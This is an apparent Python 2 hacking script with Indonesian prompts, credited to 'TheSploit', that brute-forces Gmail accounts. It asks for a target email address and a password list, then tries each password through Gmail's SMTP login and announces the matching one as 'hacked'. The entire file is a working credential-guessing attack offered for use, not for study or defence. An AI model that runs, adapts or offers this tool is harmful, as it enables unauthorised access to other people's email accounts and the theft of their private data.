#!/usr/bin/python
# Coded By TheSploit

import smtplib
from os import system

def main():
   print '==========================================='
   print '= Author  :TheSploit 	                   l'
   print '= Whatsapp:081316577616       	          l'
   print '= GitHub  :https://github.com/TheSploit    l'
   print '==========================================='
   print '\n                                               '
   print '  +++++++++++++++++++++++++++++++++++++++++++    '
   print '  +++++++++++++++++++++++++++++++++++++++++++    '
   print '  +++++++++++++++++++++++++++++++++++++++++++    '
   print '  ===========================================    '
   print '  ________________________________________________ '
   print '  /                                                \ '
   print ' |    _________________________________________     |' 
   print ' |   |                                         |    |'
   print ' |   |  C:\> _   Gmail Bruteforce              |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |                                         |    |'
   print ' |   |_________________________________________|    | '
   print ' |                                                  |'
   print '  \_________________________________________________/'
   print '         \___________________________________/'


main()
print '[1] Mulai Bruteforce'
print '[2] Keluar'
option = input('TheSploit>')
if option == 1:
   file_path = raw_input('Lokasi dari Passwordlist :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('Email Target :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Password dari Akun ini Berhasil diRetas :' + password + '     <<'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Password dari Akun ini Berhasil diRetas :' + password + '     <<'

            break
         else:
            print '[!] Password Tidak Sesuai => ' + password
login()
